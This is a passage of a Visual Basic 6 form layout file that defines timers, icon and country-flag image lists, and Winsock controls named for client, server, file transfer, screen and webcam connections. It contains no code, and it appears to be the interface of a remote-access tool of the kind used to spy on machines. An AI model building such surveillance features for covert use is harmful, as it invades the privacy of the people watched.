         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   0
      Left            =   2760
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   21
      Top             =   360
      Width           =   6735
      Begin VB.Timer tmrconcontrol 
         Interval        =   1000
         Left            =   1800
         Top             =   1920
      End
      Begin VB.Timer tmrtransfer 
         Interval        =   1
         Left            =   6240
         Top             =   3960
      End
      Begin Client.AnimatedGifCtl AnimatedGifCtl1 
         Height          =   3135
         Left            =   2040
         TabIndex        =   297
         Top             =   720
         Width           =   2655
         _ExtentX        =   4683
         _ExtentY        =   5530
         BackColor       =   0
         Picture         =   "Form1.frx":6517B
      End
      Begin VB.PictureBox taskcon 
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   495
         Left            =   1920
         Picture         =   "Form1.frx":81F06
         ScaleHeight     =   435
         ScaleWidth      =   435
         TabIndex        =   249
         Top             =   0
         Visible         =   0   'False
         Width           =   495
      End
      Begin VB.Timer Timer2 
         Left            =   2520
         Top             =   480
      End
      Begin MSComctlLib.ImageList imlist 
         Left            =   2760
         Top             =   0
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   53
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":97068
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":973E5
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":97762
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":97ADF
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":97F31
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":98367
               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":985FC
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":98878
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":98C95
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":990E3
               Key             =   ""
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":99507
               Key             =   ""
            EndProperty
            BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":99924
               Key             =   ""
            EndProperty
            BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":99D3D
               Key             =   ""
            EndProperty
            BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":99FDC
               Key             =   ""
            EndProperty
            BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9A42D
               Key             =   ""
            EndProperty
            BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9A693
               Key             =   ""
            EndProperty
            BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9A92A
               Key             =   ""
            EndProperty
            BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9AD62
               Key             =   ""
            EndProperty
            BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9AFC8
               Key             =   ""
            EndProperty
            BeginProperty ListImage20 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9B3E6
               Key             =   ""
            EndProperty
            BeginProperty ListImage21 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9B818
               Key             =   ""
            EndProperty
            BeginProperty ListImage22 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9BA9F
               Key             =   ""
            EndProperty
            BeginProperty ListImage23 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9BEC7
               Key             =   ""
            EndProperty
            BeginProperty ListImage24 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9C2FC
               Key             =   ""
            EndProperty
            BeginProperty ListImage25 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9C71E
               Key             =   ""
            EndProperty
            BeginProperty ListImage26 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9C999
               Key             =   ""
            EndProperty
            BeginProperty ListImage27 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9CDAB
               Key             =   ""
            EndProperty
            BeginProperty ListImage28 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9D017
               Key             =   ""
            EndProperty
            BeginProperty ListImage29 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9D423
               Key             =   ""
            EndProperty
            BeginProperty ListImage30 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9D830
               Key             =   ""
            EndProperty
            BeginProperty ListImage31 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9DC3C
               Key             =   ""
            EndProperty
            BeginProperty ListImage32 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9E089
               Key             =   ""
            EndProperty
            BeginProperty ListImage33 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9E4B0
               Key             =   ""
            EndProperty
            BeginProperty ListImage34 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9E723
               Key             =   ""
            EndProperty
            BeginProperty ListImage35 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9E996
               Key             =   ""
            EndProperty
            BeginProperty ListImage36 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9EBFE
               Key             =   ""
            EndProperty
            BeginProperty ListImage37 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9EE6D
               Key             =   ""
            EndProperty
            BeginProperty ListImage38 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9F2A7
               Key             =   ""
            EndProperty
            BeginProperty ListImage39 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9F4FB
               Key             =   ""
            EndProperty
            BeginProperty ListImage40 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9F917
               Key             =   ""
            EndProperty
            BeginProperty ListImage41 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":9FD29
               Key             =   ""
            EndProperty
            BeginProperty ListImage42 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A0145
               Key             =   ""
            EndProperty
            BeginProperty ListImage43 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A0560
               Key             =   ""
            EndProperty
            BeginProperty ListImage44 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A07D5
               Key             =   ""
            EndProperty
            BeginProperty ListImage45 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A0BE0
               Key             =   ""
            EndProperty
            BeginProperty ListImage46 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A0FE4
               Key             =   ""
            EndProperty
            BeginProperty ListImage47 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A1264
               Key             =   ""
            EndProperty
            BeginProperty ListImage48 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A1689
               Key             =   ""
            EndProperty
            BeginProperty ListImage49 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A19D9
               Key             =   ""
            EndProperty
            BeginProperty ListImage50 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A1D28
               Key             =   ""
            EndProperty
            BeginProperty ListImage51 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A1F86
               Key             =   ""
            EndProperty
            BeginProperty ListImage52 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A22E5
               Key             =   ""
            EndProperty
            BeginProperty ListImage53 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A24D7
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.ImageList sysinfolist 
         Left            =   3360
         Top             =   0
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   34
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A2719
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A2A6B
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A2DBD
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A3077
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A3331
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A3623
               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A3909
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A3C5B
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A3F4D
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A429F
               Key             =   ""
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A45F1
               Key             =   ""
            EndProperty
            BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A4983
               Key             =   ""
            EndProperty
            BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A4CD5
               Key             =   ""
            EndProperty
            BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A5027
               Key             =   ""
            EndProperty
            BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A5339
               Key             =   ""
            EndProperty
            BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A55EF
               Key             =   ""
            EndProperty
            BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A58B1
               Key             =   ""
            EndProperty
            BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A5B73
               Key             =   ""
            EndProperty
            BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A5E35
               Key             =   ""
            EndProperty
            BeginProperty ListImage20 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A60F7
               Key             =   ""
            EndProperty
            BeginProperty ListImage21 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A63B9
               Key             =   ""
            EndProperty
            BeginProperty ListImage22 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A667B
               Key             =   ""
            EndProperty
            BeginProperty ListImage23 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A6855
               Key             =   ""
            EndProperty
            BeginProperty ListImage24 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A6BA7
               Key             =   ""
            EndProperty
            BeginProperty ListImage25 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A6EF9
               Key             =   ""
            EndProperty
            BeginProperty ListImage26 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A724B
               Key             =   ""
            EndProperty
            BeginProperty ListImage27 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A755D
               Key             =   ""
            EndProperty
            BeginProperty ListImage28 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A77BF
               Key             =   ""
            EndProperty
            BeginProperty ListImage29 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A7ED1
               Key             =   ""
            EndProperty
            BeginProperty ListImage30 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A8223
               Key             =   ""
            EndProperty
            BeginProperty ListImage31 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A8775
               Key             =   ""
            EndProperty
            BeginProperty ListImage32 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A8AC7
               Key             =   ""
            EndProperty
            BeginProperty ListImage33 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A8DB9
               Key             =   ""
            EndProperty
            BeginProperty ListImage34 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A92BB
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin MSWinsockLib.Winsock wskClient 
         Left            =   2040
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         LocalPort       =   81
      End
      Begin MSWinsockLib.Winsock wskServer 
         Index           =   0
         Left            =   0
         Top             =   480
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin MSWinsockLib.Winsock wsktransfer 
         Left            =   480
         Top             =   0
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         LocalPort       =   81
      End
      Begin MSWinsockLib.Winsock wskscreen 
         Left            =   960
         Top             =   0
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         LocalPort       =   81
      End
      Begin MSWinsockLib.Winsock wskwebcam 
         Left            =   1440
         Top             =   0
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         LocalPort       =   81
      End
      Begin MSComctlLib.ImageList imgflags 
         Left            =   4080
         Top             =   0
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   11
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   247
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A97BD
               Key             =   "ad"
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A994C
               Key             =   "ae"
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A9AD1
               Key             =   "af"
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A9C5E
               Key             =   "ag"
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A9DE3
               Key             =   "ai"
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":A9F70
               Key             =   "al"
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AA0FE
               Key             =   "am"
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AA285
               Key             =   "an"
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AA411
               Key             =   "ao"
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AA521
               Key             =   "ar"
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AA6AB
               Key             =   "as"
            EndProperty
            BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AA834
               Key             =   "at"
            EndProperty
            BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AA9B9
               Key             =   "au"
            EndProperty
            BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AAB4F
               Key             =   "aw"
            EndProperty
            BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AACD8
               Key             =   "ax"
            EndProperty
            BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AAE6C
               Key             =   "az"
            EndProperty
            BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AAFFA
               Key             =   "ba"
            EndProperty
            BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AB181
               Key             =   "bb"
            EndProperty
            BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AB30D
               Key             =   "bd"
            EndProperty
            BeginProperty ListImage20 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AB492
               Key             =   "be"
            EndProperty
            BeginProperty ListImage21 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AB615
               Key             =   "c"
            EndProperty
            BeginProperty ListImage22 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AB797
               Key             =   "bg"
            EndProperty
            BeginProperty ListImage23 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AB91B
               Key             =   "bh"
            EndProperty
            BeginProperty ListImage24 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ABAA6
               Key             =   "bi"
            EndProperty
            BeginProperty ListImage25 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ABC38
               Key             =   "bj"
            EndProperty
            BeginProperty ListImage26 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ABDC4
               Key             =   "bm"
            EndProperty
            BeginProperty ListImage27 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ABF4F
               Key             =   "bn"
            EndProperty
            BeginProperty ListImage28 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AC0E0
               Key             =   "bo"
            EndProperty
            BeginProperty ListImage29 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AC263
               Key             =   "br"
            EndProperty
            BeginProperty ListImage30 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AC3EE
               Key             =   "bs"
            EndProperty
            BeginProperty ListImage31 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AC569
               Key             =   "bt"
            EndProperty
            BeginProperty ListImage32 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AC6FE
               Key             =   "bv"
            EndProperty
            BeginProperty ListImage33 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AC892
               Key             =   "bw"
            EndProperty
            BeginProperty ListImage34 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ACA1A
               Key             =   "by"
            EndProperty
            BeginProperty ListImage35 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ACB9F
               Key             =   "bz"
            EndProperty
            BeginProperty ListImage36 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ACD2B
               Key             =   "ca"
            EndProperty
            BeginProperty ListImage37 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ACEBF
               Key             =   "catalonia"
            EndProperty
            BeginProperty ListImage38 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ACFC9
               Key             =   "cc"
            EndProperty
            BeginProperty ListImage39 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AD158
               Key             =   "cd"
            EndProperty
            BeginProperty ListImage40 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AD267
               Key             =   "cf"
            EndProperty
            BeginProperty ListImage41 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AD3EF
               Key             =   "cg"
            EndProperty
            BeginProperty ListImage42 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AD572
               Key             =   "ch"
            EndProperty
            BeginProperty ListImage43 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AD6DA
               Key             =   "ci"
            EndProperty
            BeginProperty ListImage44 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AD866
               Key             =   "ck"
            EndProperty
            BeginProperty ListImage45 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AD9EC
               Key             =   "cl"
            EndProperty
            BeginProperty ListImage46 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ADB74
               Key             =   "cm"
            EndProperty
            BeginProperty ListImage47 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ADD01
               Key             =   "cn"
            EndProperty
            BeginProperty ListImage48 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":ADE8B
               Key             =   "co"
            EndProperty
            BeginProperty ListImage49 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AE008
               Key             =   "cr"
            EndProperty
            BeginProperty ListImage50 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AE18B
               Key             =   "cs"
            EndProperty
            BeginProperty ListImage51 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AE313
               Key             =   "cu"
            EndProperty
            BeginProperty ListImage52 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AE49E
               Key             =   "cv"
            EndProperty
            BeginProperty ListImage53 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AE629
               Key             =   "cx"
            EndProperty
            BeginProperty ListImage54 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AE7B0
               Key             =   "cy"
            EndProperty
            BeginProperty ListImage55 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AE939
               Key             =   "cz"
            EndProperty
            BeginProperty ListImage56 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AEABF
               Key             =   "de"
            EndProperty
            BeginProperty ListImage57 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AEC45
               Key             =   "dj"
            EndProperty
            BeginProperty ListImage58 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AEDD2
               Key             =   "dk"
            EndProperty
            BeginProperty ListImage59 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AEF64
               Key             =   "dm"
            EndProperty
            BeginProperty ListImage60 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AF0F0
               Key             =   "do"
            EndProperty
            BeginProperty ListImage61 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AF276
               Key             =   "dz"
            EndProperty
            BeginProperty ListImage62 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AF404
               Key             =   "ec"
            EndProperty
            BeginProperty ListImage63 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AF58A
               Key             =   "ee"
            EndProperty
            BeginProperty ListImage64 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AF712
               Key             =   "eg"
            EndProperty
            BeginProperty ListImage65 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AF899
               Key             =   "eh"
            EndProperty
            BeginProperty ListImage66 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AFA1C
               Key             =   "englang"
            EndProperty
            BeginProperty ListImage67 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AFBA7
               Key             =   "er"
            EndProperty
            BeginProperty ListImage68 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AFD2C
               Key             =   "es"
            EndProperty
            BeginProperty ListImage69 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":AFEB0
               Key             =   "et"
            EndProperty
            BeginProperty ListImage70 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B0038
               Key             =   "europeanunion"
            EndProperty
            BeginProperty ListImage71 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B00FF
               Key             =   "fam"
            EndProperty
            BeginProperty ListImage72 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B028D
               Key             =   "fi"
            EndProperty
            BeginProperty ListImage73 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B041C
               Key             =   "fj"
            EndProperty
            BeginProperty ListImage74 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B05AA
               Key             =   "fk"
            EndProperty
            BeginProperty ListImage75 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B073A
               Key             =   "fm"
            EndProperty
            BeginProperty ListImage76 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B08CF
               Key             =   "fo"
            EndProperty
            BeginProperty ListImage77 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B0A5D
               Key             =   "fr"
            EndProperty
            BeginProperty ListImage78 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B0BE7
               Key             =   "ga"
            EndProperty
            BeginProperty ListImage79 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B0D6A
               Key             =   "gb"
            EndProperty
            BeginProperty ListImage80 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B0E8A
               Key             =   "gd"
            EndProperty
            BeginProperty ListImage81 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B1012
               Key             =   "ge"
            EndProperty
            BeginProperty ListImage82 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B11A9
               Key             =   "gf"
            EndProperty
            BeginProperty ListImage83 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B1333
               Key             =   "gh"
            EndProperty
            BeginProperty ListImage84 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B14B5
               Key             =   "gi"
            EndProperty
